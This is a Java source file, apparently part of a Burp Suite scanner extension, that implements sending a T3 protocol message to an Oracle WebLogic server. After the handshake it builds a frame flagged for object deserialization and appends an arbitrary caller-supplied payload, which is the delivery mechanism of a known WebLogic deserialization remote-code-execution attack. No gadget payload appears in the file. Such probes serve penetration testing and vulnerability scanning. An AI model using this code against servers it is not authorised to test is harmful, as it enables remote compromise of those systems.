package probes;

import burp.Utilities;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public interface T3Protocol {

    default void send(String host, int port, String protocol, byte[] payload) throws Exception {
        Socket s = new Socket(host, port);
        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength
        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";

        if (protocol.equalsIgnoreCase("https")) {
            header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
        }

        s.getOutputStream().write(header.getBytes());
        s.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String versionInfo = br.readLine();

        versionInfo = versionInfo.replace("HELO:", "");
        versionInfo = versionInfo.replace(".false", "");
        Utilities.out.println(
                String.format("[-] Sending a T3 request to WebLogic server(%s)...", versionInfo)
        );

        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1

        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = Utilities.bytesToHex(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        byte[] headers = Utilities.hexToBytes(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            dataLen.append("0".repeat((8 - hexLen.length())));
        }

        dataLen.append(hexLen);
        s.getOutputStream().write(Utilities.hexToBytes(dataLen + datas.toString()));
        s.getOutputStream().flush();
        s.close();
    }
}
